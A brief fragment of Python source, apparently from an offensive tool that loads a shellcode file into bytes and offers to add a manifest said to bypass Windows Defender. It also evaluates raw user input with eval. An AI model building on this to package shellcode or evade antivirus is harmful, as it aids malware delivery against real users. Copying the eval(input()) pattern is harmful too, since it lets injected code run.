...
""",'blue'))
	...
	try:
		with open(shellcodeFile, encoding='utf-8', errors='ignore') as shellcodeFileHandle:
			shellcodeBytes = bytearray(shellcodeFileHandle.read(), 'utf8')
	...
	bool = eval(input(color('[*]Do you want to add Manifest (Generally Bypasses Windows Defender)[ 1 or 0 ]?')))
	# Display Results
	print(color("\n==================================== RESULT ====================================\n"))
	if bool:
